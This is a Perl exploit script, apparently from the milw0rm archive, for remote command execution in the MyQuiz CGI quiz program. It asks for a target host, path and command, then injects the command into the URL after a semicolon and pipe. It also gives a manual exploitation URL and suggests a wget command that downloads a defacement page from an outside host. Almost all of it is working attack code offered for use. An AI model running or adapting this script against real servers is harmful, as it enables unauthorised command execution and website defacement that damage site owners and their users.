#!/usr/bin/perl
# => MyQuiz Remote Command Execution Exploit
# -> By Hessam-x  / www.hackerz.ir
# manual exploiting --> http://[target]/cgi-bin/myquiz.pl/ask/;<Command>|
# SecurityFocus [bug] : http://www.securityfocus.com/archive/1/423921/30/0/threaded
# /   |   \_____    ____ |  | __ ___________________
#/    ~    \__  \ _/ ___\|  |/ // __ \_  __ \___   /
#\    Y    // __ \\  \___|    <\  ___/|  | \//    /
# \___|_  /(____  /\___  >__|_ \\___  >__|  /_____ \
#       \/      \/     \/     \/    \/            \/
# Iran Hackerz Security Team
# Hessam-x : www.hessamx.net

use LWP::Simple;

print "-------------------------------------------\n";
print "= MyQuiz Remote Command Execution Exploit =\n";
print "=       By Hessam-x  - www.hackerz.ir     =\n";
print "-------------------------------------------\n\n";


       print "Target(www.example.com)\> ";
       chomp($targ = <STDIN>);

       print "path: (/cgi-bin/myquiz.pl/ask/)\>";
       chomp($path=<STDIN>);

       print "command: (wget www.hackerz.ir/deface.htm)\>";
       chomp($comd=<STDIN>);


$page=get("http://".$targ.$path) || die "[-] Unable to retrieve: $!";
print "[+] Connected to: $targ\n";
print "[~] Sending exploiting request,wait....\n";
get("http://".$targ.$path.";".$comd."|")
print "[+] Exploiting request done!\n";
print "Enjoy !";

# milw0rm.com [2006-02-06]